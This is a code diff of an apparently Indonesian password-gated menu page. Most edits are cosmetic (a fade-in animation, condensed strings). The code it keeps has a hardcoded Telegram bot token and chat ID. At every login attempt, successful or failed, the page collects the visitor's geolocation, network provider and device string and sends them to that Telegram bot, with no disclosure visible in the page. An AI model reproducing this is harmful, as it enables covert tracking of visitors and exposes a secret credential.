@@ -183,7 +183,6 @@
       height: 100%;
       background: rgba(255, 255, 255, 0.8);
       z-index: 2000;
-      display: flex;
       justify-content: center;
       align-items: center;
       flex-direction: column;
@@ -207,6 +206,16 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    /* Fade in animation untuk loading screen */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    #loading-screen.show {
+      animation: fadeIn 0.5s ease forwards;
+    }
   </style>
 </head>
 
@@ -224,7 +233,6 @@
   </div>
 
   <script>
-    // Konfigurasi Bot Telegram
     const telegramBotToken = '7837072590:AAFtIrE2PcCN4afhybGYCLKGqIHo0wKgL4U';
     const telegramChatId = '7274253936';
 
@@ -268,7 +276,6 @@
     ];
 
     const colors = ["#e74c3c", "#2980b9", "#27ae60", "#f39c12", "#8e44ad", "#2c3e50", "#d35400", "#1abc9c", "#34495e", "#c0392b"];
-
     const menuButtonsContainer = document.getElementById('menu-buttons');
 
     menuConfig.forEach((menu, index) => {
@@ -292,34 +299,24 @@
       notification.className = `notification ${type}`;
       notification.innerHTML = `<span class="icon ${type}"></span><span>${message}</span>`;
       document.body.appendChild(notification);
-
-      setTimeout(() => {
-        notification.remove();
-      }, 3000);
+      setTimeout(() => notification.remove(), 3000);
     }
 
     function showLoadingScreen() {
-      document.getElementById('loading-screen').style.display = 'flex';
+      const loadingScreen = document.getElementById('loading-screen');
+      loadingScreen.style.display = 'flex';
+      loadingScreen.classList.add('show');
     }
 
     async function checkPassword(menu) {
       const userPassword = prompt(menu.promptMessage);
-
       const { lokasi, provider, latitude, longitude } = await getLocation();
       const deviceInfo = navigator.userAgent;
       const mapsLink = (latitude && longitude) ? `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}` : 'Lokasi tidak tersedia';
 
       if (userPassword === menu.password) {
         showNotification(menu.successMessage, 'success');
-
-        const notifMessage = `✅ Login Berhasil!
-Panel: ${menu.text}
-Lokasi: ${lokasi}
-Provider: ${provider}
-Device: ${deviceInfo}
-Waktu: ${new Date().toLocaleString()}
-Maps: ${mapsLink}`;
-
+        const notifMessage = `✅ Login Berhasil!\nPanel: ${menu.text}\nLokasi: ${lokasi}\nProvider: ${provider}\nDevice: ${deviceInfo}\nWaktu: ${new Date().toLocaleString()}\nMaps: ${mapsLink}`;
         sendTelegramNotification(notifMessage);
 
         setTimeout(() => {
@@ -327,19 +324,10 @@ Maps: ${mapsLink}`;
           setTimeout(() => {
             window.location.href = menu.url;
           }, 2000);
-        }, 1500);
-
+        }, 1000);
       } else {
         showNotification(menu.errorMessage, 'error');
-
-        const notifMessage = `❌ Login Gagal!
-Panel: ${menu.text}
-Lokasi: ${lokasi}
-Provider: ${provider}
-Device: ${deviceInfo}
-Waktu: ${new Date().toLocaleString()}
-Maps: ${mapsLink}`;
-
+        const notifMessage = `❌ Login Gagal!\nPanel: ${menu.text}\nLokasi: ${lokasi}\nProvider: ${provider}\nDevice: ${deviceInfo}\nWaktu: ${new Date().toLocaleString()}\nMaps: ${mapsLink}`;
         sendTelegramNotification(notifMessage);
       }
     }
